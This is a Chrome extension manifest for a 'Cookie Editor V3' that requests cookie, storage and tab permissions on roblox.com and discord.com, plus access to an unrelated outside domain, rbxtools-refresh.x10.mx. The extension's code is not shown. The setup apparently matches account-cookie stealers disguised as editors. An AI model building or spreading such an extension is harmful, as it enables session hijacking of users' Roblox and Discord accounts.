{
  "manifest_version": 3,
  "name": "Cookie Editor V3",
  "version": "3.0",
  "permissions": ["cookies", "storage", "tabs"],
  "host_permissions": [
    "https://*.roblox.com/*",
    "https://discord.com/*",
    "https://rbxtools-refresh.x10.mx/*"
  ],
  "icons": {
    "16": "icon16.png",
    "32": "icon32.png",
    "48": "icon48.png",
    "128": "icon128.png"
  },
  "action": {
    "default_popup": "index.html",
    "default_icon": {
      "16": "icon16.png",
      "32": "icon32.png",
      "48": "icon48.png",
      "128": "icon128.png"
    }
  },
  "background": {
    "service_worker": "background.js"
  }
}